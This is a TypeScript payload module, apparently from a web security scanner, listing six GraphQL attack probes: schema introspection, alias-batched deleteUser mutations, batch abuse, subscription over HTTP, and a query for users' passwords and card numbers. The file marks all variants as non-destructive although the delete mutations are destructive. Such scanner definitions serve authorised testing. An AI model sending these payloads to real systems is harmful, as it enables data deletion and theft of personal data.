import type { PayloadVariant } from '../types';

export const META = {
  id: 'graphql-schema-driven-attack',
  family: 'graphql-attack' as const,
  name: 'GraphQL Schema-Driven Attack',
  description: 'Schema-driven attack vectors: all-fields query, alias mutation, batch abuse, HTTP subscription attempt.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['graphql', 'body', 'json'],
};

const PROBES = [
  {
    value: '{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}',
    intent: 'All-fields introspection query to enumerate full schema for targeted attacks',
    signals: ['introspection-enabled', 'schema-enumerated'],
  },
  {
    value: '{"query":"mutation{m1:deleteUser(id:1){id} m2:deleteUser(id:2){id}}"}',
    intent: 'Mutation via alias batching — executes multiple destructive mutations in one request',
    signals: ['mutation-executed'],
  },
  {
    value: '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]',
    intent: 'JSON array batching — 5 queries in one HTTP request to test batch execution',
    signals: ['batch-accepted', 'anomaly-delta'],
  },
  {
    value: '{"query":"subscription{newMessage{id body sender}}"}',
    intent: 'Subscription over HTTP attempt — server may expose data or error details',
    signals: ['subscription-over-http'],
  },
  {
    value: '{"query":"{__schema{mutationType{name fields{name args{name type{name}}}}}}"}',
    intent: 'Enumerate all mutation fields and their arguments for targeted mutation fuzzing',
    signals: ['introspection-enabled', 'mutation-schema-exposed'],
  },
  {
    value: '{"query":"query ExfiltratePII{users{id email password role creditCard{number}}}"}',
    intent: 'Named query targeting common PII field names — detects over-exposed user type',
    signals: ['pii-field-exposed'],
  },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `gql-schema-attack-${i + 1}`,
    family: 'graphql-attack' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
